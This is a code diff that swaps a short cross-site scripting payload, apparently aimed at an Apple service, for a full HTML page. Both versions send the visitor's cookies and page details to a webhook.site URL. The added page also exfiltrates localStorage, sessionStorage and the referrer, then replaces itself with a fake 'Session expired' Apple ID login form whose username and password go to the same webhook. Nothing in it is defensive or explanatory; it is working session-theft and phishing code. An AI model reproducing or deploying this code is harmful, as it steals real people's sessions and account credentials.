@@ -1,12 +1,72 @@
-<script>
-fetch("https://webhook.site/bed70d88-4b8b-425d-85f8-7393fca9412b", {
-  method: "POST",
-  body: [
-    "XSS ✅ via Apple CSD",
-    "Cookie: " + document.cookie,
-    "Location: " + document.location,
-    "UserAgent: " + navigator.userAgent
-  ].join("\n")
-});
-alert("XSS ✅ on Apple");
-</script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Loading...</title>
+  <meta http-equiv="refresh" content="1">
+  <style>
+    body {
+      background-color: #000;
+      color: #0f0;
+      font-family: monospace;
+      padding: 20px;
+    }
+    #creds {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <h1>Loading...</h1>
+  <script>
+    // ✅ إعداد البيانات
+    const data = {
+      cookie: document.cookie,
+      localStorage: JSON.stringify(localStorage),
+      sessionStorage: JSON.stringify(sessionStorage),
+      userAgent: navigator.userAgent,
+      url: location.href,
+      origin: location.origin,
+      referrer: document.referrer,
+    };
+
+    // ✅ إرسال إلى Webhook
+    fetch("https://webhook.site/bed70d88-4b8b-425d-85f8-7393fca9412b", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(data)
+    });
+
+    // ✅ إنشاء نموذج تسجيل دخول وهمي
+    setTimeout(() => {
+      document.body.innerHTML = `
+        <h2>Session expired. Please log in again.</h2>
+        <form id="creds">
+          <input type="text" id="username" placeholder="Apple ID"><br>
+          <input type="password" id="password" placeholder="Password"><br>
+          <button type="submit">Log In</button>
+        </form>
+      `;
+      document.getElementById('creds').style.display = 'block';
+
+      document.getElementById("creds").addEventListener("submit", function(e) {
+        e.preventDefault();
+        const creds = {
+          username: document.getElementById("username").value,
+          password: document.getElementById("password").value
+        };
+        fetch("https://webhook.site/bed70d88-4b8b-425d-85f8-7393fca9412b", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(creds)
+        });
+        alert("Logging in...");
+      });
+    }, 3000);
+  </script>
+</body>
+</html>
